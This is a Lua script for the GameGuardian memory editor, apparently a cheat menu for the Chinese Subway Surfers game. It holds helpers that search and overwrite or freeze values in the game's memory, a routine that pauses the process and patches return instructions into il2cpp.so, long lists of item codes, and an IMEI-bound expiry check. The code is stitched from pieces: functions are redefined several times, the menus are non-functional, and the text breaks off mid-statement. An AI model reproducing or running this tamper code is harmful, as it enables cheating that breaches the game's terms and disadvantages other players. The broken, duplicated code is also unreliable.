function split(szFullString, szSeparator)  local nFindStartIndex = 1  local nSplitIndex = 1  local nSplitArray = {} while true do    local    nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex)    if not nFindLastIndex then      nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString))      break end    nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1)    nFindStartIndex = nFindLastIndex + string.len(szSeparator)    nSplitIndex = nSplitIndex + 1 end return  nSplitArray end function  xgxc(szpy, qmxg) for x = 1, #(qmxg) do    xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"]    xgsz = qmxg[x]["value"]    gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}})    xgsl = xgsl + 1 end end function  xqmnb(qmnb)  gg.clearResults()  gg.setRanges(qmnb[1]["memory"])  gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"])  if gg.getResultCount() == 0 then    gg.toast(qmnb[2]["name"] .. "\n开启失败")   else    gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"])    gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"])    gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"])    if gg.getResultCount() == 0 then      gg.toast(qmnb[2]["name"] .. "\n开启失败")     else      sl = gg.getResults(999999)      sz = gg.getResultCount()      xgsl = 0 if sz > 999999 then        sz = 999999 end for i = 1, sz do        pdsz = true for v = 4, #(qmnb) do if            pdsz == true then            pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"]            pysz[1].flags = qmnb[v]["type"]            szpy = gg.getValues(pysz)            pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";")            tzszpd = szpd[1]            pyszpd = szpd[2]            if tzszpd == pyszpd then              pdjg = true pdsz = true else              pdjg = false pdsz = false end end end        if pdjg == true then          szpy = sl[i].address xgxc(szpy, qmxg)          xgjg = true end end      if xgjg == true then        gg.toast(qmnb[2]["name"] .. "\n开启成功\n共修改" .. xgsl .. "条数据")       else        gg.toast(qmnb[2]["name"] .. "\n开启失败")      end    end  end  end
D=gg.TYPE_DWORD  E=gg.TYPE_DOUBLE  F=gg.TYPE_FLOAT W=gg.TYPE_WORD B=gg.TYPE_BYTE X=gg.TYPE_XOR Q=gg.TYPE_QWORD

Qr_UIP2FazG='Main'
gg.clearResults() sj={} xgz={} gg.toast("欢迎使用秋风脚本") function search(ss,lx,nc,dz1,dz2) if ss~=nil then if lx~=nil then if nc==nil then nc=32 end gg.setRanges(nc) if dz1==nil then dz1="-1" end if dz2==nil then dz1="0" end gg.searchNumber(ss,lx,false,gg.SIGN_EQUAL,dz1,dz2) sl=gg.getResultCount() if sl~=0 then sj=gg.getResults(sl) gg.toast("搜索到 "..sl.." 个结果") gg.clearResults() else gg.toast("未搜索到结果") end else gg.toast("无搜索值类型") end else gg.toast("无需搜索值") end end function py1(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value==value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function py2(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value~=value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function xg1(value,lx,py,dj) if #sj~=nil then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end function xg2(bz,value,lx,py,dj) if #bz~=nil then z={} for i=1,#bz do z[i]={} z[i].address=bz[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end function bc(bz) if sj~=nil then _ENV[bz]=sj else gg.toast("无数据") end end function BaAdd(add) if gg.getTargetInfo().x64==true then t=gg.getValues({[1]={address=add,flags=32}}) return t[1].value else t=gg.getValues({[1]={address=add,flags=4}}) return t[1].value&0xFFFFFFFF end end function set(dz,xg,lx,dj) if dj=="true" then gg.addListItems({{address=dz,flags=lx,value=xg,freeze=true}}) else gg.setValues({{address=dz,flags=lx,value=xg}}) end gg.toast("已修改完成~") end

DWORD=gg.TYPE_DWORD  DOUBLE=gg.TYPE_DOUBLE  FLOAT=gg.TYPE_FLOAT WORD=gg.TYPE_WORD BYTE=gg.TYPE_BYTE XOR=gg.TYPE_XOR QWORD=gg.TYPE_QWORD

D=gg.TYPE_DWORD  E=gg.TYPE_DOUBLE  F=gg.TYPE_FLOAT W=gg.TYPE_WORD B=gg.TYPE_BYTE X=gg.TYPE_XOR Q=gg.TYPE_QWORD
-------------不懂勿动------------
------------道具赛配置---------------
ms = { }
function setvalue ( add , value , falgs , dj )
	local WY = { } WY [ 1 ] = { } WY [ 1 ].address = add WY [ 1 ].value = value WY [ 1 ].flags = falgs
	if dj == true then
		WY [ 1 ].freeze = true gg.addListItems ( WY )
	else
		gg.setValues ( WY )
	end
end

function ms.ss ( num , ty , nc )
	local GGNUMBER_1 = num
	local GGNUMBER_2 = ty
	local GGNUMBER_3 = false
	local GGNUMBER_4 = gg.SIGN_EQUAL
	local GGNUMBER_5 = 0x3000000
	local GGNUMBER_6 = 0xFFFFFFFF
	local GGNUMBER_7 = 0
	gg.clearResults ( )
	gg.setRanges ( nc )
	gg.searchNumber ( GGNUMBER_1 , GGNUMBER_2 , GGNUMBER_3 , GGNUMBER_4 , GGNUMBER_5 , GGNUMBER_6 , GGNUMBER_7 )
	Result = gg.getResults ( gg.getResultCount ( ) )
end

function ms.py ( num , py , ty )
	if ( Result and # Result ~= 0 ) then
		t = { }
		for i , v in ipairs ( Result ) do
			t [ i ] = { } t [ i ].address = v.address + py t [ i ].flags = ty
		end
		t = gg.getValues ( t )
		for i , v in ipairs ( t ) do
			if v.value ~= num then
				Result [ i ] = nil
			end
		end
		local MS = { }
		for i , v in pairs ( Result ) do
			MS [ # MS + 1 ] = v
		end
		Result = MS
	end
end

function ms.bc ( )
	data = { }
	if Result == nil or # Result == 0 then
		gg.alert ( "开启失败" )
	else
		for i , v in pairs ( Result ) do
			data [ # data + 1 ] = v.address
		end
	end
	Result = nil
end

function ms.edit ( nn , off , ty , dj )
	if ( Result ) then
		ms.bc ( )
	end
	if # data > 0 then
		for i , v in ipairs ( data ) do
			setvalue ( v + off , nn , ty , dj or false )
		end
		gg.toast ( Name.."成功" )
	end
end
So_X32 = function ( Address , Value )
	local Somod = gg.getRangesList ( 'il2cpp.so' ) [ 1 ]
	if Somod == nil then
		gg.alert ( '请重新选择地铁跑酷进程' )
		gg.setProcessX ( )
	else
		local So = Somod.start
		local Add = So + Address
		gg.processPause ( )
		gg.setValues ( { { address = Add , flags = 4 , value = Value } } )
		gg.setValues ( { { address = Add + 4 , flags = 4 , value = "1EFF2FE1r" } } )
		gg.processResume ( )
	end
end
So_X32 = function ( Address , Value )
	local Somod = gg.getRangesList ( 'il2cpp.so' ) [ 1 ]
	if Somod == nil then
		gg.alert ( '请重新选择地铁跑酷进程' )
	else
		local So = Somod.start
		local Add = So + Address
		gg.processPause ( )
		gg.setValues ( { { address = Add , flags = 4 , value = Value } } )
		gg.setValues ( { { address = Add + 4 , flags = 4 , value = "1EFF2FE1r" } } )
		gg.processResume ( )
	end
end
function readPointer(name, offset, i)
	local re = gg.getRangesList(name)
	local x64 = gg.getTargetInfo().x64
	local va = {[true] = 32, [false] = 4}
	if re[i or 1] then
		local addr = re[i or 1].start + offset[1]
		for i = 2, #offset do
			addr = gg.getValues({{address = addr, flags = va[x64]}})
			if not x64 then
				addr[1].value = addr[1].value & 0xFFFFFFFF
			end
			addr = addr[1].value + offset[i]
		end
		return addr
	end
end

function gg.edits(addr, Table, name)
	local Table1 = {{}, {}}
	for k, v in ipairs(Table) do
		local value = {address = addr + v[3], value = v[1], flags = v[2], freeze = v[4]}
		if v[4] then
			Table1[2][#Table1[2] + 1] = value
		else
			Table1[1][#Table1[1] + 1] = value
		end
	end

end


function dm()
UI = "dm"
local menu = gg.multiChoice({
"人物代码",
"滑板代码",
"背饰代码",
"相框代码",
"宝物代码",
"道具代码",
}, nil, "代码查询")
if menu then
for i in pairs(menu) do
_ENV[({"rwdm","hbdm","bsdm","xkdm","bwdm","djdm",})[i]]()
  end
 end 
end

function rwdm()
local list = {
"搜索代码",
"杰克0",
"琪琪1",
"小黑2",
"钉子3",
"青青4",
"弗兰克5",
"卷卷6",
"小胖7",
"露西8",
"忍者9",
"机器人10",
"莎莎11",
"祖伊12",
"波迪13",
"K王子14",
"僵尸杰克15",
"精灵琪琪16",
"17托尼",
"卡门18",
"罗伯特19",
"金20",
"浅浅21",
"尼克22",
"可可23",
"孙悟空24",
"阿丽25",
"艾迪26",
"杰米27",
"跑跑28",
"美美29",
"福喜杰克30",
"米娜31",
"罗莎32",
"奥莉薇亚33",
"爱迪生34",
"洛奇35",
"韦恩36",
"欢欢37",
"茉莉38",
"鬼鬼39",
"宝拉40",
"小丫仔41",
"邦邦42",
"雷克斯43",
"小武哥44",
"伊奇45",
"艾美46",
"哪吒47",
"马可48",
"希腊-尼科斯49",
"哈库50",
"科罗娜51",
"麦克52",
"白小嫦53",
"旧金山-詹妮54",
"春节-小春55",
"雅罗56",
"玉依57",
"马达加斯加-爱娜58",
"秘鲁-卡洛斯59",
"新加坡-佳佳60",
"龙宝宝61",
"小宁62",
"嫦娥63",
"亚奇64",
"拉蒙娜65",
"劳伦66",
"马利克67",
"吕小布68",
"左利尔69",
"菲利普70",
"芙蕾雅71",
"小李72",
"邬童73",
"班小松74",
"伊柯75",
"陶西76",
"萨尔玛77",
"安谧78",
"嘟嘟79",
"曼尼80",
"少年嬴政81",
"小乔82",
"尼古拉83",
"十三妹84",
"貂蝉85",
"杨戬86",
"伊泽87",
"刘三姐88",
"索菲亚89 ",
"威尼斯-迪伦90",
"三亚-海音91",
"街舞机器人92",
"阿一93",
"阿龙94",
"安琪95",
"斯嘉丽96",
"冰冰97",
"小虎98",
"艾丽西娅99",
"麦娅100",
"鸿仔101",
"阿莹102",
"苏黎世-雨果103",
"哇！ 兔子机器人104",
"卡里姆105",
"素贞106",
"糖心107",
"梅108",
"淮安109",
"飞天110",
"迪戈111",
"圣诞小黑112",
"铁甲武僧113",
"鼠小易114",
"阿尔巴115",
"未来杰克116",
"时光少年117",
"蓝骑士118",
"艾波索119",
"甜心少女120",
"卡勒姆121",
"小石城-洛克122",
"太空人123",
"冰雪杰克124",
"冰雪弗兰克125",
"冰雪钉子126",
"冰雪琪琪127",
"冰雪青青128",
"许愿神龙129",
"穿越华夏-小雅130",
"穿越华夏-牛犇犇131",
"穿越华夏-鼠萌萌132",
"开学季-元气少年133",
"柏林-妮娜134",
"柏林-泽恩135",
"纽约-达瑞尔136",
"纽约-拉娜137",
"小狐狸138",
"牛津-邦妮139",
"哥本哈根版本-维京人140",
"空间站版本-机械弗兰克141",
"空间站版本-电音机器人142",
"艾嘉桦143",
"柠檬妹妹144",
"米娅145",
"武田146",
"环儿147",
"科拉尔148",
"杰森149",
"塔哈150",
"菲尼克斯151",
"艾斯152",
"福气琪琪153",
"克莱门汀154",
"姜博155",
"克莱奥156",
"哈西娜157",
"查理158",
"雅美159",
"假面机器人160",
"夜莺161",
"玛雅162",
"超级琪琪163",
"超级小黑164",
"超级杰克165",
"喵千金166",
"幻觉167",
"番薯仔168",
"鹿少爷169",
"超级青青170",
"精灵杰克171",
"精灵小黑172",
"精灵琪琪173",
"虎冲冲174",
"妲己175",
"迪迦杰克176",
"巴尔坦杰克177",
"超级费尔南多178",
"宋毅179",
"奥斯汀180",
"大眼仔181",
"乔治182",
"骑士183",
"兔跳跳184",
"隐秘小子185",
"机械兔186",
"假面机器人187",
"乌兰188",
"巴兹189",
"保安190",
"欧布小黑191",
"哥莫拉青青192",
"电玩番薯仔193",
"隐秘女孩194",
"喷雾机器人195",
"兔小萌196",
"FBL16245",
}
local name = {} --- 功能函数表
local UI = gg.choice(list, nil, '人物代码')
if UI then
if UI == 1 then
local prompt = gg.prompt({ '请输入关键词进行搜索' }, { '' }, { 'text' })
if prompt then
local str = prompt[1] local t = {} local t1 = {}
for i = 2, #list - 1 do if string.find(list[i], str) then table.insert(t, list[i]) table.insert(t1, name[i - 1]) end end
if #t == 0 then
gg.toast('无搜索结果') else
local c = gg.choice(t, nil, '关键词：['.. str .. '],共搜索到' .. #t .. '条结果')
if c then end end end else end if UI == 2 then os.exit()end end FX1=0 
end

function hbdm()
local list = {
"搜索代码",
"默认滑板0",
"大跳板1",
"卧板2",
"街头滑板3",
"滑浪板4",
"超级英雄5",
"星星6",
"迈阿密7",
"怪兽8",
"火焰9",
"自由女神10",
"风之子11",
"犀鸟12",
"木板13",
"小鸡14",
"机车15",
"足球16",
"腹地17",
"大白鲨18",
"樱花19",
"猫咪20",
"狂热21",
"弗拉明戈22",
"玫瑰23",
"熊猫24",
"龙25",
"泰迪26",
"南瓜27",
"铃铛28",
"雪花29",
"孟加拉30",
"泡泡糖31",
"仙人掌32",
"麋鹿33",
"香蕉34",
"逐风35",
"传送器36",
"巡逻车37",
"鳄鱼38",
"乌龟39",
"红鼻子40",
"劳莱斯41",
"狮王42",
"提基43",
"飞毯44",
"龙舟45",
"贡多拉46",
"风火轮47",
"飞羽48",
"浪花49",
"雷电50",
"筋斗云51",
"玛塔塔52",
"影子53",
"圣诞火车54",
"花朵55",
"独角兽56",
"变色龙57",
"魔鬼鱼58",
"图米59",
"超级跑车60",
"狮子61",
"金牌62",
"奥尼63",
"鲸鱼64",
"合金跑车65",
"灵符66",
"雄鹰67",
"冰川68",
"赤兔69",
"踏板70",
"秘宝71",
"疯狂赛车72",
"尤克里里73",
"纪念日74",
"音槌75",
"黄包车76",
"眼镜蛇77",
"太空飞船78",
"桂花扇79",
"骷髅80",
"招魂幡81",
"南瓜扫帚82",
"竹简83",
"风韵84",
"水晶雪橇85",
"海盗船86",
"圣甲虫87",
"羊88",
"羞花89",
"哮天犬90",
"热狗91",
"浪漫甜心92",
"竹筏93",
"琉璃94",
"喷射飞行器95",
"多彩云96",
"蓝莓滑板97",
"低音炮98",
"冲浪滑板99",
"平底锅100",
"黄色的士101",
"帆船滑板102",
"音符103",
"魔毯104",
"锦鲤105",
"龙王炮106",
"金猪107",
"烟花火箭108",
"唱片109",
"像素爱心110",
"黄色闪电111",
"发条112",
"蓝色风暴113",
"油纸伞114",
"梦幻蝴蝶115",
"海蛇116",
"青铜战马117",
"莲台118",
"落叶119",
"皇家战马120",
"七色彩虹121",
"极速光轮122",
"电音风暴123",
"TapTAp滑板124",
"小米滑板125",
"星际巡洋舰126",
"时光涡轮127",
"无人机128",
"飞影129",
"朋克滑板130",
"老爷车131",
"旅行者一号132",
"马头琴133",
"电音熊134",
"自由涂鸦135",
"迷你兔136",
"维京战船137",
"旋风138",
"秘密139",
"开拓者140",
"幻影141",
"调色板142",
"樱之花143",
"神龙144",
"海浪145",
"骆驼146",
"海滩板147",
"冰雪奥义148",
"姜饼149",
"红桃皇后150",
"原子瓦151",
"星盘152",
"向阳153",
"测速仪154",
"括普155",
"月羽156",
"浮夸157",
"萌妹飞车158",
"液体159",
"番薯电动车160",
"小鹿板161",
"磁铁162",
"超级冲浪板163",
"高音号滑板164",
"雪云滑板165",
"寅虎滑板166",
"狐狸滑板167",
"胜利飞燕168",
"电测仪169",
"夜琵琶170",
"彩虹炸弹171",
"微博滑板172",
"兔兔气垫船173",
"盾牌飞行器174",
"年年有余175",
"赛博摩托176",
"枫叶177",
"战斗机178",
"鸡动机179",
}
local name = {} --- 功能函数表
local UI = gg.choice(list, nil, '滑板代码')
if UI then
if UI == 1 then
local prompt = gg.prompt({ '请输入关键词进行搜索' }, { '' }, { 'text' })
if prompt then
local str = prompt[1] local t = {} local t1 = {}
for i = 2, #list - 1 do if string.find(list[i], str) then table.insert(t, list[i]) table.insert(t1, name[i - 1]) end end
if #t == 0 then
gg.toast('无搜索结果') else
local c = gg.choice(t, nil, '关键词：['.. str .. '],共搜索到' .. #t .. '条结果')
if c then end end end else end if UI == 2 then os.exit()end end FX1=0 
end

function bsdm()
local list = {
"搜索代码",
"幸运星背包1",
"圣诞雪人2",
"机械之翼3",
"天使之翼4",
"绿野风车5",
"愚乐气球6",
"迷蝶之翼7",
"甜心花环8",
"时光之翼9",
"玲珑秋月10",
"星辰11",
"圣诞树12",
"许愿神龙背饰13",
"元气书包14",
"帆布克15",
"琵琶16",
"神光棒17",
"狗狗背饰18",
"大眼泡泡19",
"超能氧气瓶20",
"闪电篮球21",
"吸铁石22",
"欧布之光23",
"游戏机24",
"小兔书包25",
}
local name = {} --- 功能函数表
local UI = gg.choice(list, nil, '背饰代码')
if UI then
if UI == 1 then
local prompt = gg.prompt({ '请输入关键词进行搜索' }, { '' }, { 'text' })
if prompt then
local str = prompt[1] local t = {} local t1 = {}
for i = 2, #list - 1 do if string.find(list[i], str) then table.insert(t, list[i]) table.insert(t1, name[i - 1]) end end
if #t == 0 then
gg.toast('无搜索结果') else
local c = gg.choice(t, nil, '关键词：['.. str .. '],共搜索到' .. #t .. '条结果')
if c then end end end else end if UI == 2 then os.exit()end end FX1=0 
end

function xkdm()
local list = {
"搜索代码",
"2019年春节限定头像框1",
"情人节限定头像框2",
"角色达人头像框3",
"滑板达人头像框4",
"愚人节限定头像框5",
"毅力达人限定头像框6",
"劳动节限定头像框7",
"端午节限定头像框8",
"夏日清凉头像框9",
"钻石璀璨头像框10",
"七夕限定头像框11",
"中秋节限定头像框12",
"飞天头像框13",
"万圣节头像框14",
"万圣霓虹头像框15",
"秋日头像框代码16",
"6周年头像框代码17",
"冰雪节头像框代码18",
"2020春节限定头像框代码19",
"我爱饺子头像框代码20",
"我爱汤圆头像框代码21",
"去春游吧头像框代码22",     
"中国加油头像框代码23",
"愚乐一下头像框代码24",         
"纯真记忆头像框代码25",         
"爱心传递头像框代码26",          
"7周年头像框代码27",        
"圣诞迎新头像框代码28",      
"许愿神龙头像框代码29", 
"2021年春节限定头像框代码30",        
"春日芳华头像框代码31",       
"愚人节恶搞头像框代码32",       
"2021劳动节头像框代码33",         
"牛津头像框代码34",      
"2021端午头像框代码35",      
"2021暑假头像框代码36",      
"2021巴厘岛像框代码37",       
"2021中秋头像框代码38",      
"长安限定头像框代码39",     
"一起来捣蛋头像框代码40",       
"8周年限定头像框代码41",        
"创作达人头像框代码42",          
"大神头像框代码43",         
"双旦快乐头像框代码44",
"2022春节头像框代码45",          
"春意盎然头像框代码46",          
"愚你同乐头像框代码47",           
"劳动快乐头像框代码48",         
"端午快乐头像框代码49",          
"摩纳哥限定头像框代码50",            
"暑假快乐头像框代码51",             
"冰岛限定头像框代码52",             
"武汉限定头像框代码53",              
"社团S1赛季冠军头像框代码54",           
"社团S1赛季亚军头像框代码55",       
"社团S1赛季季军头像框代码56",         
"社团S1赛季精英头像框代码57",           
"社团S1赛季勇者头像框代码58",           
"万圣节限定头像框59",
"9周年限定头像框60",
"深圳限定头像框61",
"社团S2赛季冠军头像框代码62",           
"社团S2赛季亚军头像框代码63",       
"社团S2赛季季军头像框代码64",         
"社团S2赛季精英头像框代码65",           
"社团S2赛季勇者头像框代码66",   
"新城洛阳头像框67",
"奥特曼限定68",
"微博专属头像框69",
"Fanbook头像框70",
"哥本哈根专属头像框71",
"社团S3赛季冠军头像框代码72",         
"社团S3赛季亚军头像框代码73",       
"社团S3赛季季军头像框代码74",         
"社团S3赛季精英头像框代码75",           
"社团S3赛季勇者头像框代码76",  
"跑神杯S3冠军社团头像框77",  
"跑神杯S3亚军社团头像框78", 
"跑神杯S3季军社团头像框79", 
"跑神杯S3纪念头像框80", 
"呼和浩特版本头像框81", 
"劳动最光荣头像框82", 
"大神作者头像框83", 
"人气作者头像框84", 
"新秀作者头像框85", 
"欧布头像框86", 
"大朋友头像框87", 
"小朋友头像框88", 
"电玩番薯仔头像框89", 
"校园时光头像框90", 
}
local name = {} --- 功能函数表
local UI = gg.choice(list, nil, '头像框代码')
if UI then
if UI == 1 then
local prompt = gg.prompt({ '请输入关键词进行搜索' }, { '' }, { 'text' })
if prompt then
local str = prompt[1] local t = {} local t1 = {}
for i = 2, #list - 1 do if string.find(list[i], str) then table.insert(t, list[i]) table.insert(t1, name[i - 1]) end end
if #t == 0 then
gg.toast('无搜索结果') else
local c = gg.choice(t, nil, '关键词：['.. str .. '],共搜索到' .. #t .. '条结果')
if c then end end end else end if UI == 2 then os.exit()end end FX1=0 
end

function bwdm()
local list = {
"搜索代码",
"1小丑面具",
"2露西耳环",
"3紫色花球",
"4金属发条",
"5火焰纹章",
"6星星项链",
"7机械手表",
"8金色耳环",
"9黄金皇冠",
"10摩托头盔",
"11狼牙项链",
"12纯金手表",
"13金箍",
"14乾坤圈",
"15水手猫",
"16积木",
"17灵符",
"18黄金盔甲",
"19令牌",
"20龙蛋",
"21南瓜",
"22月兔",
"23舞狮头",
"24甜心项链",
"25圣诞帽",
"26夹克",
"27红色战衣",
"28火红灯笼",
"29美人折扇",
"30卫衣",
"31校服",
"32相机",
"33耳机",
"34眼镜",
}
local name = {} --- 功能函数表
local UI = gg.choice(list, nil, '宝物代码')
if UI then
if UI == 1 then
local prompt = gg.prompt({ '请输入关键词进行搜索' }, { '' }, { 'text' })
if prompt then
local str = prompt[1] local t = {} local t1 = {}
for i = 2, #list - 1 do if string.find(list[i], str) then table.insert(t, list[i]) table.insert(t1, name[i - 1]) end end
if #t == 0 then
gg.toast('无搜索结果') else
local c = gg.choice(t, nil, '关键词：['.. str .. '],共搜索到' .. #t .. '条结果')
if c then end end end else end if UI == 2 then os.exit()end end FX1=0 
end

function djdm()
local list = {
"搜索代码",
"1导弹",
"2蓝色魔鬼炸弹",
"4护盾",
"8香蕉皮",
"16颜料炸弹",
"32恶魔",
"64粘液罐子",
"128小狗",
"256滑板",
"225云雾",
"272减速乌龟",
"320净化饮料",
"384磁铁",
}
local name = {} --- 功能函数表
local UI = gg.choice(list, nil, '查询')
if UI then
if UI == 1 then
local prompt = gg.prompt({ '请输入关键词进行搜索' }, { '' }, { 'text' })
if prompt then
local str = prompt[1] local t = {} local t1 = {}
for i = 2, #list - 1 do if string.find(list[i], str) then table.insert(t, list[i]) table.insert(t1, name[i - 1]) end end
if #t == 0 then
gg.toast('无搜索结果') else
local c = gg.choice(t, nil, '关键词：['.. str .. '],共搜索到' .. #t .. '条结果')
if c then end end end else end if UI == 2 then os.exit()end end FX1=0 
end



changan= { }
changan.controlRotation2 = function(control, time)
    luajava.runUiThread(function()
        import "android.view.animation.Animation"
        import "android.animation.ObjectAnimator"
        xuanzhuandonghua = ObjectAnimator:ofFloat(control, "rotation", {
            0, 360
        })
        xuanzhuandonghua:setRepeatCount(0)
        xuanzhuandonghua:setRepeatMode(Animation.RESTART)
        xuanzhuandonghua:setDuration(time)
        xuanzhuandonghua:start()
    end)
end
--by秋风

                
                
function setvalue(address,flags,value)
	local tt={}
	tt[1]={}
	tt[1].address=address
	tt[1].flags=flags
	tt[1].value=value
	gg.setValues(tt)
	gg.addListItems(tt)
end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end

function readAdd(add)
	t=gg.getValues({[1]={address=add,flags=4}})
	add=string.format("%X",t[1].value)
	if (#add)==16 then add=add:sub(9,16) end
	if (#add)==1 then add=add.."0000000" else
		add=string.format("%d","0x"..add)
	end
	return add
end

function getAdd(so,offset,off1)
	add=gg.getRangesList(so)[1].start
	add=readAdd(add+offset)
	return add
end

function addListltems(address,flags,value,freeze,toast)
	t={}
	t[1]={}
	t[1].address=address
	t[1].flags=flags
	t[1].value=value
	t[1].freeze=freeze
	gg.addListItems(t)
end
-- 读取内存地址的函数
function readPointer(name, offset, i)
    local re = gg.getRangesList(name) 
    local x64 = gg.getTargetInfo().x64 
    local va = {[true]=32, [false]=4} 
    if re[i or 1] then
        local addr = re[i or 1].start + offset[1] 
        for i = 2, #offset do
            addr = gg.getValues({{address=addr, flags=va[x64]}}) 
            if not x64 then
                addr[1].value = addr[1].value & 0xFFFFFFFF 
            end
            addr = addr[1].value + offset[i] 
        end
        return addr
    end
end
-- telegram: @BLSZN
-- 链条为小羽神提供
-- 拿去安装压缩加密码引流,全家暴毙
function gg.edits(addr, Table, name)
    local Table1 = {{}, {}} 
    for k, v in ipairs(Table) do
        local value = {address = addr+v[3], value = v[1], flags = v[2], freeze = v[4]}
        if v[4] then
            Table1[2][#Table1[2]+1] = value 
        else
            Table1[1][#Table1[1]+1] = value
        end
    end
    gg.addListItems(Table1[2])
    gg.setValues(Table1[1])
    gg.toast((name or "") .. "开启成功, 共修改"..#Table.."个值")
end

function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end--静态
function setvalue(address,flags,value) 
local CatWill={} 
CatWill[1]={} 
CatWill[1].address=address 
CatWill[1].flags=flags 
CatWill[1].value=value 
gg.setValues(CatWill) 
end
function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end--by秋风
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
			print(string.char(231,190,164,58).._Q)
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} 
            
            while true do
                while aP34qTjNQXYK3KJH < os.time() do
                    gg.alert('脚本已过期')
                    os.exit()
                end
                while a2dIiITouwrTgkMk ~= '0fa08270df7f34d0a482881e8090bb22' do
                    os.exit()
                end
                while checktrue ~= (imei .. aswgqSYlvl4v1gjJ.user_time .. api_time..xxxxxxx_22934..aYbIRvQTGiu3zJ1Z) do
                    os.exit()
                end
        
        
                while avwykaq3JHHQVkOH < os.time() do
                    gg.alert('脚本已过期')
                    os.exit()
                end
                while aeP2BbmZRYdnH84V ~= '5e9a9f4a187809fe1954fa74e1bb5d32' do
                    os.exit()
                end
                while checktrue ~= (imei .. a0erBhhbMEuSBgGc.user_time .. api_time..xxxxxxx_22574..awzD07xqZWyOTMqk) do
                    os.exit()
                end
        
         local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy=szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}}) else gg.addListItems({[1] = {address = xgpy, flags = xglx, freeze = xgdj, value = xgsz}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy=gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy=sl[i].address xgxc(szpy, qmxg) end end if 